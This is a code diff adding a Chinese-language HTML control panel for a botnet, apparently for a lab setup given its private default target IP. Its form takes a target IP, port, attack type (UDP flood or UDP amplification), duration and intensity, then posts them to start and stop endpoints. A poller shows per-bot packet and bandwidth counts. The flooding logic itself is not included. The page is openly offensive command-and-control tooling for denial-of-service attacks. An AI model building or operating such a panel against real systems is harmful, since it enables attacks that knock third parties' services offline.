@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>僵尸网络控制面板</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #fff;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { text-align: center; margin-bottom: 30px; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .status-bar {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-around;
+            backdrop-filter: blur(10px);
+        }
+        .status-item { text-align: center; }
+        .status-value { font-size: 2em; font-weight: bold; color: #4CAF50; }
+        .status-label { font-size: 0.9em; opacity: 0.8; margin-top: 5px; }
+        .control-panel {
+            background: rgba(255,255,255,0.1);
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+            margin-right: 10px;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        .btn-start { background: #4CAF50; color: white; }
+        .btn-start:hover { background: #45a049; transform: translateY(-2px); }
+        .btn-stop { background: #f44336; color: white; }
+        .btn-stop:hover { background: #da190b; transform: translateY(-2px); }
+        .bot-list {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .bot-item {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .bot-info { flex: 1; }
+        .bot-status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+        .status-online { background: #4CAF50; }
+        .status-offline { background: #f44336; }
+        .status-attacking { background: #ff9800; animation: pulse 1s infinite; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; }
+        .stat-item { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; text-align: center; }
+        .attack-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-weight: bold;
+            display: none;
+        }
+        .attack-indicator.active {
+            display: block;
+            background: #ff9800;
+            animation: pulse 1s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-indicator" id="attackIndicator">🚨 攻击进行中</div>
+    
+    <div class="container">
+        <h1>🤖 僵尸网络控制面板</h1>
+        
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-value" id="totalBots">0</div>
+                <div class="status-label">总Bot数</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="onlineBots">0</div>
+                <div class="status-label">在线Bot</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="totalPackets">0</div>
+                <div class="status-label">总包数</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="totalBandwidth">0</div>
+                <div class="status-label">总带宽 (Mbps)</div>
+            </div>
+        </div>
+        
+        <div class="control-panel">
+            <h2>攻击配置</h2>
+            <div class="form-group">
+                <label>目标IP:</label>
+                <input type="text" id="targetIp" value="10.10.20.20">
+            </div>
+            <div class="form-group">
+                <label>目标端口:</label>
+                <input type="number" id="targetPort" value="9999">
+            </div>
+            <div class="form-group">
+                <label>攻击类型:</label>
+                <select id="attackType">
+                    <option value="udp_flood">UDP Flood</option>
+                    <option value="udp_amplification">UDP Amplification</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>持续时间 (秒):</label>
+                <input type="number" id="duration" value="60">
+            </div>
+            <div class="form-group">
+                <label>攻击强度:</label>
+                <select id="intensity">
+                    <option value="low">低</option>
+                    <option value="medium" selected>中</option>
+                    <option value="high">高</option>
+                </select>
+            </div>
+            <button class="btn btn-start" onclick="startAttack()">🚀 开始攻击</button>
+            <button class="btn btn-stop" onclick="stopAttack()">🛑 停止攻击</button>
+        </div>
+        
+        <div class="bot-list">
+            <h2>Bot状态</h2>
+            <div id="botList"></div>
+        </div>
+    </div>
+    
+    <script>
+        function updateStatus() {
+            fetch('/api/status')
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('totalBots').textContent = data.total_bots;
+                    document.getElementById('onlineBots').textContent = data.online_bots;
+                    document.getElementById('totalPackets').textContent = data.total_packets.toLocaleString();
+                    
+                    const bandwidth = (data.total_bytes * 8 / 1000000).toFixed(2);
+                    document.getElementById('totalBandwidth').textContent = bandwidth;
+                    
+                    const indicator = document.getElementById('attackIndicator');
+                    if (data.attack_active) {
+                        indicator.classList.add('active');
+                    } else {
+                        indicator.classList.remove('active');
+                    }
+                    
+                    const botList = document.getElementById('botList');
+                    botList.innerHTML = '';
+                    
+                    data.bots.forEach(bot => {
+                        const botDiv = document.createElement('div');
+                        botDiv.className = 'bot-item';
+                        
+                        const statusClass = bot.online ? 
+                            (bot.status === 'attacking' ? 'status-attacking' : 'status-online') : 
+                            'status-offline';
+                        
+                        const pps = bot.packets_sent > 0 ? (bot.packets_sent / 60).toFixed(0) : 0;
+                        const mbps = bot.bytes_sent > 0 ? (bot.bytes_sent * 8 / 1000000 / 60).toFixed(2) : 0;
+                        
+                        botDiv.innerHTML = `
+                            <div class="bot-info">
+                                <strong>${bot.bot_id}</strong> (${bot.ip})
+                                <div class="stats">
+                                    <div class="stat-item">
+                                        <div>${bot.packets_sent.toLocaleString()}</div>
+                                        <div style="font-size:0.8em;opacity:0.7">总包数</div>
+                                    </div>
+                                    <div class="stat-item">
+                                        <div>${pps}</div>
+                                        <div style="font-size:0.8em;opacity:0.7">PPS</div>
+                                    </div>
+                                    <div class="stat-item">
+                                        <div>${mbps}</div>
+                                        <div style="font-size:0.8em;opacity:0.7">Mbps</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bot-status ${statusClass}">${bot.status}</div>
+                        `;
+                        botList.appendChild(botDiv);
+                    });
+                });
+        }
+        
+        function startAttack() {
+            const config = {
+                target_ip: document.getElementById('targetIp').value,
+                target_port: parseInt(document.getElementById('targetPort').value),
+                attack_type: document.getElementById('attackType').value,
+                duration: parseInt(document.getElementById('duration').value),
+                intensity: document.getElementById('intensity').value
+            };
+            
+            fetch('/api/start_attack', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(config)
+            }).then(() => {
+                alert('攻击已启动！');
+            });
+        }
+        
+        function stopAttack() {
+            fetch('/api/stop_attack', {
+                method: 'POST'
+            }).then(() => {
+                alert('攻击已停止！');
+            });
+        }
+        
+        // 每秒更新一次状态
+        setInterval(updateStatus, 1000);
+        updateStatus();
+    </script>
+</body>
+</html>
